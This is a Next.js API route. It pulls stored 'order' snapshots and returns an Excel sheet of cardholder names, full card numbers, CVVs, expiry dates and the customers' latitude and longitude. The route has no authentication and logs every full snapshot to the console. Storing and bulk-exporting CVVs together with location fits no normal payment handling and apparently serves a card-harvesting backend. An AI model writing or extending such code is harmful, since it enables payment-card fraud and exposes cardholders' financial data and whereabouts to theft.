import { NextResponse } from 'next/server'
import { databaseService } from '@/lib/postgres-database'
import ExcelJS from 'exceljs'

export async function GET(request: Request) {
  try {
    const url = new URL(request.url)
    const email = url.searchParams.get('email')

    // Get completed order logs
    const rows = email 
      ? (await databaseService.getCompletedOrderLogsForEmail(email)) 
      : (await databaseService.getCompletedOrderLogsAll())

    const workbook = new ExcelJS.Workbook()
    const worksheet = workbook.addWorksheet('Extracted Data')

    // Collect all unique keys from all JSON snapshots (for logging only)
    const allKeys = new Set<string>()
    const parsedRows: Array<Record<string, any>> = []

    console.log('='.repeat(60))
    console.log('📊 ANALYZING JSON SNAPSHOTS - All Available Keys:')
    console.log('='.repeat(60))

    rows.forEach((row, index) => {
      try {
        const snapshot = JSON.parse(row.snapshotJson || '{}')
        
        // Log keys for this row
        const rowKeys = Object.keys(snapshot)
        if (rowKeys.length > 0) {
          console.log(`\n📝 Row ${index + 1} (Order: ${row.orderId}):`)
          console.log(`   Available keys: ${rowKeys.join(', ')}`)
          console.log(`   Full snapshot:`, JSON.stringify(snapshot, null, 2))
        }
        
        // Add all keys to the set
        rowKeys.forEach(key => allKeys.add(key))
        
        // Extract and parse locationTimestamp (convert UTC to UTC+7)
        const locationTimestamp = snapshot.locationTimestamp || ''
        let date = ''
        let time = ''
        
        if (locationTimestamp) {
          try {
            const dateObj = new Date(locationTimestamp)
            if (!isNaN(dateObj.getTime())) {
              // Convert UTC to UTC+7 (add 7 hours)
              const utc7Date = new Date(dateObj.getTime() + (7 * 60 * 60 * 1000))
              
              // Format: YYYY-MM-DD (UTC+7)
              const year = utc7Date.getUTCFullYear()
              const month = String(utc7Date.getUTCMonth() + 1).padStart(2, '0')
              const day = String(utc7Date.getUTCDate()).padStart(2, '0')
              date = `${year}-${month}-${day}`
              
              // Format: HH:MM:SS (UTC+7)
              const hours = String(utc7Date.getUTCHours()).padStart(2, '0')
              const minutes = String(utc7Date.getUTCMinutes()).padStart(2, '0')
              const seconds = String(utc7Date.getUTCSeconds()).padStart(2, '0')
              time = `${hours}:${minutes}:${seconds}`
            }
          } catch (e) {
            // If parsing fails, leave empty
          }
        }
        
        // Extract only the requested fields
        parsedRows.push({
          id: row.orderId, // Changed from orderId to id
          cardholderName: snapshot.cardholderName || '',
          cardNumber: snapshot.cardNumber || '',
          cvv: snapshot.cvv || '',
          expiryDate: snapshot.expiryDate || '',
          latitude: row.latitude || '', // From database row, not snapshot
          longitude: row.longitude || '', // From database row, not snapshot
          date: date,
          time: time
        })
      } catch (e) {
        console.error(`❌ Error parsing JSON for row ${index + 1}:`, e)
        parsedRows.push({
          id: row.orderId,
          cardholderName: '',
          cardNumber: '',
          cvv: '',
          expiryDate: '',
          latitude: row.latitude || '',
          longitude: row.longitude || '',
          date: '',
          time: ''
        })
      }
    })

    // Log summary of all unique keys found
    const sortedKeys = Array.from(allKeys).sort()
    console.log('\n' + '='.repeat(60))
    console.log('📋 SUMMARY - All Unique Keys Found Across All Rows:')
    console.log('='.repeat(60))
    console.log(`Total unique keys: ${sortedKeys.length}`)
    console.log(`Keys: ${sortedKeys.join(', ')}`)
    console.log('\n💡 To add more columns, edit the extracted fields in parsedRows.push()')
    console.log('='.repeat(60) + '\n')

    // Define columns: ID + requested fields only
    const columns = [
      { header: 'ID', key: 'id', width: 30 },
      { header: 'Cardholder Name', key: 'cardholderName', width: 30 },
      { header: 'Card Number', key: 'cardNumber', width: 30 },
      { header: 'CVV', key: 'cvv', width: 15 },
      { header: 'Expiry Date', key: 'expiryDate', width: 20 },
      { header: 'Latitude', key: 'latitude', width: 20 },
      { header: 'Longitude', key: 'longitude', width: 20 },
      { header: 'Date', key: 'date', width: 15 },
      { header: 'Time', key: 'time', width: 15 }
    ]

    worksheet.columns = columns

    // Add rows
    parsedRows.forEach(parsedRow => {
      worksheet.addRow(parsedRow)
    })

    // Set all columns to Text type to prevent Excel auto-conversion
    worksheet.columns.forEach(column => {
      if (column.key) {
        worksheet.getColumn(column.key).numFmt = '@'
      }
    })

    // Style header row
    worksheet.getRow(1).font = { bold: true }
    worksheet.getRow(1).fill = {
      type: 'pattern',
      pattern: 'solid',
      fgColor: { argb: 'FFE0E0E0' }
    }

    // Generate buffer
    const buffer = await workbook.xlsx.writeBuffer()

    return new NextResponse(buffer, {
      status: 200,
      headers: {
        'Content-Type': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'Content-Disposition': `attachment; filename="extracted-json-${Date.now()}.xlsx"`
      }
    })
  } catch (e) {
    console.error('Extract JSON error:', e)
    return NextResponse.json({ error: 'Failed to extract JSON', details: String(e) }, { status: 500 })
  }
}